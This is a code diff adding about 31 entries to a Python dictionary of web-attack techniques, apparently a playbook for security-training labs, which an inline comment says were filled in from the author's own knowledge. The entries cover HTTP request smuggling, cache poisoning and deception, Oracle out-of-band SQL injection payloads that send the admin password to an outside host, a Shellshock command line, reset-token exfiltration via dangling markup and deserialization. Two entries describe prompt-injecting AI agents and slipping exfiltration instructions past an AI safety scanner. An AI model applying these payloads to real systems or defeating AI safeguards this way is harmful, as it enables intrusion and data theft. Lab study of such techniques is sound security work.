@@ -611,6 +611,116 @@ T.update({
     "server validates only the first request on the connection -> 2nd hits admin"),
 })
 
+# ---- the remaining ~31 filled from my own knowledge (classic smuggling + non-smuggling tail) ----
+T.update({
+ # request smuggling (classic CL.TE / TE.CL family)
+ "http request smuggling, confirming a cl.te vulnerability via differential responses":
+   ("front-end CL, back-end TE: send Content-Length covering only up to '0\\r\\n\\r\\n', then a smuggled "
+    "prefix; the 2nd request gets the leftover -> abnormal/error response", "next request returns an anomaly"),
+ "http request smuggling, confirming a te.cl vulnerability via differential responses":
+   ("front-end TE, back-end CL: chunked body whose declared chunk hides a smuggled request from the "
+    "CL-reading back-end", "next request poisoned/errored = TE.CL confirmed"),
+ "http request smuggling, basic cl.te vulnerability":
+   ("CL.TE: headers Content-Length + Transfer-Encoding:chunked; body '0\\r\\n\\r\\nGPOST /x ...' so the "
+    "back-end starts a new (smuggled) request after the zero chunk", "smuggled GPOST appears"),
+ "http request smuggling, basic te.cl vulnerability":
+   ("TE.CL: chunked body 'NN\\r\\nSMUGGLED-REQUEST\\r\\n0\\r\\n\\r\\n' with Content-Length:4 so back-end "
+    "stops early, leaving the smuggled request", "smuggled request processed next"),
+ "http request smuggling, obfuscating the te header":
+   ("make front/back disagree on TE: 'Transfer-Encoding: xchunked', a space before the value, duplicate "
+    "TE headers, or 'Transfer-Encoding\\n: chunked'", "one server honours TE, the other CL -> desync"),
+ "exploiting http request smuggling to bypass front-end security controls, cl.te vulnerability":
+   ("smuggle a request to a path the front-end blocks (e.g. /admin) so the back-end serves it directly",
+    "blocked endpoint reached via the smuggled request"),
+ "exploiting http request smuggling to bypass front-end security controls, te.cl vulnerability":
+   ("same as CL.TE but with the TE.CL chunked framing", "front-end control bypassed"),
+ "exploiting http request smuggling to capture other users' requests":
+   ("smuggle a request whose body is a comment-post; the victim's following request gets appended into "
+    "your comment", "victim's request (cookies) shows up in your stored comment"),
+ "exploiting http request smuggling to reveal front-end request rewriting":
+   ("smuggle a request that reflects a parameter, give it a huge length, and read the front-end-added "
+    "headers (X-Forwarded-For / internal) that get pulled into the reflection", "internal rewrite headers leak"),
+ "exploiting http request smuggling to deliver reflected xss":
+   ("smuggle a request carrying an XSS payload in a reflected header (e.g. User-Agent into a page) so the "
+    "next victim's response is poisoned with it", "victim served the reflected XSS"),
+ "exploiting http request smuggling to perform web cache poisoning":
+   ("smuggle a request that 302-redirects to your JS; the front-end caches that response against the "
+    "victim's next URL", "cache serves your redirect to all visitors"),
+ "exploiting http request smuggling to perform web cache deception":
+   ("smuggle so a victim's private response gets stored by the cache under a static-looking path you can "
+    "then fetch", "private data publicly cached"),
+ "cl.0 request smuggling":
+   ("the back-end treats Content-Length as 0 on certain endpoints (ignores the body) while the front-end "
+    "uses CL, so the body becomes a standalone smuggled request", "body processed as the next request"),
+ # web cache poisoning (remaining)
+ "targeted web cache poisoning using an unknown header":
+   ("Param Miner to discover an unkeyed header (e.g. X-Host); poison only pages keyed to the victim's "
+    "User-Agent / language", "victim-specific cache entry poisoned"),
+ "url normalization":
+   ("the cache and origin normalize the path differently; request an encoded path the app reflects "
+    "un-normalized so the XSS payload is cached", "encoded-path payload cached + served"),
+ "web cache poisoning to exploit a dom vulnerability via a cache with strict cacheability criteria":
+   ("poison an unkeyed header into JSON/config a DOM sink consumes, targeting only the resources that "
+    "meet the strict cacheability rules", "DOM sink executes the cached payload"),
+ "combining web cache poisoning vulnerabilities":
+   ("chain two unkeyed inputs (e.g. X-Forwarded-Host + X-Forwarded-Scheme) to build a working payload "
+    "where neither alone suffices", "combined headers poison the page"),
+ # SQLi OOB
+ "blind sql injection with out-of-band interaction":
+   ("Oracle: '||(SELECT extractvalue(xmltype('<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY %% x SYSTEM "
+    "\"http://OOB/\">%%x;]>'),'/l') FROM dual)-- (or UTL_HTTP.request)", "DNS/HTTP hit on Collaborator"),
+ "blind sql injection with out-of-band data exfiltration":
+   ("prepend the stolen data to the OOB host: ...SYSTEM \"http://'||(SELECT password FROM users WHERE "
+    "username='administrator')||'.OOB/\"...", "the password appears as the OOB subdomain"),
+ # business logic
+ "authentication bypass via encryption oracle":
+   ("the app encrypts attacker input somewhere (e.g. a 'stay-logged-in'/notify cookie) and decrypts it "
+    "elsewhere; use it as an oracle to encrypt a forged admin value", "forged ciphertext accepted"),
+ "bypassing access controls using email address parsing discrepancies":
+   ("register an email the validator reads as external but the app treats as @internal — encoding/quoted "
+    "tricks like 'attacker@evil.com(@internal)' or unicode/punycode", "privileged role granted"),
+ # race conditions
+ "exploiting time-sensitive vulnerabilities":
+   ("send two requests in a SINGLE packet so they share a timestamp; predict/collide a time-based token "
+    "(e.g. a password-reset token seeded from time)", "predictable token via simultaneous requests"),
+ "partial construction race conditions":
+   ("hammer the endpoint in parallel to hit the window where an object exists half-built (registered but "
+    "not yet confirmed) and use it", "act on the partially-constructed object"),
+ # web LLM
+ "exploiting ai agents to trigger secondary vulnerabilities":
+   ("prompt-inject the agent to call a backend tool with an injectable argument (SQLi / path / cmd)",
+    "the agent's tool call carries your injection -> chained vuln"),
+ "bypassing ai scanner defenses to exfiltrate sensitive information":
+   ("craft input the AI safety scanner clears (obfuscate/split the instruction) but that still drives the "
+    "agent to leak data", "exfil instruction survives the scanner"),
+ # ssrf
+ "blind ssrf with shellshock exploitation":
+   ("SSRF to an internal CGI with a Shellshock User-Agent: () { :; }; /usr/bin/nslookup $(whoami).OOB",
+    "OOB DNS shows the internal user = RCE"),
+ # auth
+ "broken brute-force protection, multiple credentials per request":
+   ('send an array of passwords in one request: {"username":"carlos","password":["a","b","letmein",...]} '
+    "so the lockout counts it as a single attempt", "many guesses, one counted attempt -> login"),
+ # deserialization
+ "exploiting ruby deserialization using a documented gadget chain":
+   ("paste a published universal Ruby gadget chain (e.g. the Net::WriteAdapter/Gem chain) Base64'd into "
+    "the session cookie", "RCE on unmarshal via the documented chain"),
+ # host header
+ "password reset poisoning via dangling markup":
+   ("inject dangling markup into the reset email via the Host/param (e.g. \"'><img src='//OOB?) so the "
+    "rest of the email — including the reset token — is exfiltrated to your server", "reset token captured"),
+ # api
+ "exploiting server-side parameter pollution in a rest url":
+   ("inject URL-encoded path/param separators into a value the back-end places into a REST URL: %2f (/) "
+    "%23 (#) to truncate the rest of the internal path, or %26 (&) to add a param — e.g. id=admin%23",
+    "internal API call returns data outside your scope"),
+ # web cache deception
+ "exploiting exact-match cache rules for web cache deception":
+   ("the cache stores paths exactly matching a static rule; append a delimiter so the URL maps to the "
+    "dynamic private page yet still matches the static cache rule (e.g. /my-account;.js or /my-account%00.css)",
+    "victim's private page cached under a public path"),
+})
+
 
 def main():
     pb._save({"version": 1, "techniques": []})        # fresh build
